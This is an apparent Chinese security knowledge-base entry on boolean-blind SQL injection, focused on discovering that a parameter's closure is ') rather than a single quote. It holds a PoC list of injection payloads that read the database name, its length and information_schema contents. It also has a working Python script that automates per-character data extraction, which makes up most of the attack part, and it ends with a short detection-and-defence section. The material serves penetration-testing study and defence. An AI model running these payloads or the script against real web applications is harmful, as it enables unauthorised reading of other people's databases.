---
id: web-generic-sqli-boolean-blind-parenthesis-closure-discovery
title: 布尔盲注先定闭合：单引号版 payload 无差异不是「没有注入」，而是闭合符实为 ')——用 1'||'1'='1 与 1')||(1='1 对比差分定出真闭合
type: scenario
domain: web
path: web/generic/sqli
technique: boolean-blind-closure-discovery-parenthesis
tags:
- web
- sqli
- boolean-blind
- closure
- manual-testing
- sqli
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:34:37+08:00'
  notes: 已对照原文核对；1'与1''响应不一致、1'||'1'='1 与 ='2 无差异故改试括号、1')||(1='1 出现差异、substr('abc',1,1)='a 自测、库名长度 7、substr(database()...) 取库名等 payload 与叙述均与正文一致；本次核对未读取图片，仅依据正文；响应差异细节与页面字段出自截图，未验证
url: /docs/web/generic/sqli/web-generic-sqli-boolean-blind-parenthesis-closure-discovery/
draft: false
kb_aliases:
- 闭合符判定
- 单引号不生效试括号
- )||(1='1
- 布尔盲注定闭合
- 手注先测闭合
---

## 一句话结论

手工布尔盲注最常见的卡点不是「怎么取数据」，而是「闭合符是什么」：先发 `1'` 与 `1''` 看响应是否不同，确认单引号能影响解析；再发 `1'||'1'='1` 与 `1'||'1'='2`，如果两条**响应完全相同**就说明闭合符不是单个单引号；改试 `1')||(1='1` 与 `1')||(1='2`，出现稳定差异即证明真实闭合是 `')`，之后所有取值 payload 都按这个闭合与 `and(1='1` 收尾来拼。

## 原理

- **布尔盲注的前提是「真/假能产生可区分响应」**：页面不回显数据、不报错时，唯一 oracle 是响应内容/长度/状态码/耗时。构造恒真与恒假两个条件，若两者响应不同，注入成立。
- **闭合符由 SQL 上下文决定**：后端可能是 `WHERE id = '$x'`、`WHERE id = ('$x')`、`WHERE id = (SELECT ... WHERE id = ('$x') AND ...)`。`'` 只闭合字符串，`')` 才同时闭合字符串与外层括号。闭合符错一位，注入片段就落在语法错误的位置，服务端统一错误页一包，看起来像「注入不存在」。
- **`||` 让条件判定不依赖 AND/OR 优先级**：`1'||'1'='1` 在 PostgreSQL/Oracle/SQLite 里是字符串连接，在 MySQL 里是逻辑或；两种语义下都能构造出「前半段任意值 或 常量真值」的结构，比 `' and 1=1` 更不容易被原有运算符优先级破坏。本例 `1')||(1='1` 闭合后整体成为 `... id = ('1')||(1='1')` 一类结构，恒真即返回正常数据。
- **差分要有稳定基线**：先用「合法值」「合法值 + 单引号」「合法值 + 两个单引号」三次请求确认页面本身稳定（无随机广告/时间戳），否则后续差异不可信。
- **定出闭合后立刻测长度**：`1')||(length(database())=7)and(1='1` 一类的恒真/恒假对比能确认库名长度，再逐字符取 `substr(database(),1,1)`。原文用 `1')||(substr('abc',1,1)='a')and(1='1` 做「已知答案自测」，先验证 payload 结构正确，再换成 `substr(database(),...)`，这是很值得照抄的做法——避免把结构错误误判为数据不对。

## 触发条件

- 存在拼接型 SQL 查询，参数落在字符串上下文且可能被括号包裹（`WHERE x = ('$in')`、`IN ('$in')`、子查询内）。
- 页面不回显数据且未开启详细报错，但真/假条件能导致响应差异（内容、长度、状态码或耗时）。
- 关键字/符号过滤不严格（本例 `'`、`|`、`(`、`)` 均未被拦），或可绕过。
- 攻击者能重复发请求并比对响应（脚本或 Burp Intruder）。

## 利用步骤

1. 建立基线：提交合法值，重复 3 次确认响应稳定（长度、关键字段一致）。
2. 试单引号：`1'` 与 `1''`，若响应不同，说明引号参与了 SQL 解析。
3. 试单引号闭合的恒真/恒假：`1'||'1'='1` 与 `1'||'1'='2`。两条响应相同 → 单引号不是完整闭合符。
4. 试括号闭合：`1')||(1='1` 与 `1')||(1='2`。出现稳定差异 → 闭合符为 `')`。
5. 结构自测：把恒真片段换成已知答案，如 `1')||(substr('abc',1,1)='a')and(1='1`，确认恒真侧仍返回正常数据（排除「恰好语法错但页面一样」的误判）。
6. 测长度：`1')||(length(database())=N)and(1='1`，二分或线性找出 N。
7. 逐字符取值：`1')||(substr(database(),i,1)='c')and(1='1`，遍历字符集；后续把 `database()` 换成 `(select table_name from information_schema.tables limit 0,1)` 等同法取表名/列名/数据。
8. 无回显差异时退化到时间盲注：把条件套进 `sleep()`/`pg_sleep()`/`WAITFOR DELAY`。

## PoC

```text
# 1. 基线
id=1

# 2. 单引号是否参与解析
id=1'
id=1''

# 3. 单引号闭合（两条相同 → 不是这个闭合）
id=1'||'1'='1
id=1'||'1'='2

# 4. 括号闭合（出现差异 → 命中）
id=1')||(1='1
id=1')||(1='2

# 5. 结构自测（已知答案必须为真）
id=1')||(substr('abc',1,1)='a')and(1='1

# 6. 库名长度
id=1')||(length(database())=7)and(1='1

# 7. 逐字符
id=1')||(substr(database(),1,1)='X')and(1='1
```

自动化（按闭合符参数化，便于换目标复用）：

```python
import requests

def oracle(payload):
    r = requests.get(URL, params={"id": payload}, timeout=10)
    return MARKER in r.text          # 恒真时出现的稳定标记

def blind(expr, closure="')||(", tail=")and(1='1"):
    lo, hi = 1, 64
    while lo < hi:                   # 二分长度
        mid = (lo + hi) // 2
        if oracle(f"1{closure}(length({expr})>{mid}){tail}"): lo = mid + 1
        else: hi = mid
    n = lo
    out = ""
    for i in range(1, n + 1):
        for c in CHARSET:            # 可换 ascii() 二分
            if oracle(f"1{closure}(substr({expr},{i},1)='{c}'){tail}"):
                out += c; break
    return out
```

`MARKER` 必须是「恒真响应独有、恒假响应没有」的稳定特征（原文的场景是页面内容整体不同，`''` 与 `'` 之别），不要用会随机变化的时间戳/广告位。

## 变体与关联

- 闭合变体：`"`、`)`、`))`、数字型无引号、`%bf%27`（GBK 宽字节）、`\`（`NO_BACKSLASH_ESCAPES` 关闭时）。
- 连接符变体：MySQL 用 `or`/`||`（`||` 是逻辑或）、PostgreSQL/Oracle/SQLite 用 `||`（字符串连接）；用 `||` 拼常量真值可绕开优先级问题。
- 尾部变体：`and(1='1`、`-- `、`#`、`/*`；若注释被过滤，可用原文这种「不注释、直接把尾部拼成合法表达式」的写法。
- oracle 变体：从「响应内容差异」退化为「响应长度差异」「状态码差异」「响应时间差异」，最后是 `sleep` 型时间盲注。
- 关联：与「布尔盲注逐字符取值」类卡的区别是本卡聚焦**闭合符判定与结构自测**这一步，那类卡默认闭合已确定；与「语义级 WAF 逐层绕过」的区别是本条不打 WAF，只解决手注第一步的定位问题。
- 关联：与「UPDATE SET 追加赋值」区别是那条是写型利用，本条只读。

## 检测与防御

- 全站参数化查询（预编译/绑定变量），禁止字符串拼接，尤其注意「看起来是数字」的参数。
- 统一错误页与统一成功页：不要因 SQL 报错/条件真假改变响应长度、状态码与字段内容，避免形成布尔 oracle。
- WAF 规则覆盖 `'`、`"`、`)`、`||`、`substr`、`length`、`database()`、`information_schema`、`sleep`、`benchmark` 等组合特征，并对同一参数高频变形请求限速。
- 数据库侧开启慢查询与错误日志审计，监控单 IP 对同一接口的规律性高频请求（逐字符盲注的典型特征：长度相近、参数仅差一个字符、响应长度两极化）。
- 权限最小化：Web 账号只授必要表的 SELECT，减少注入后的信息面。
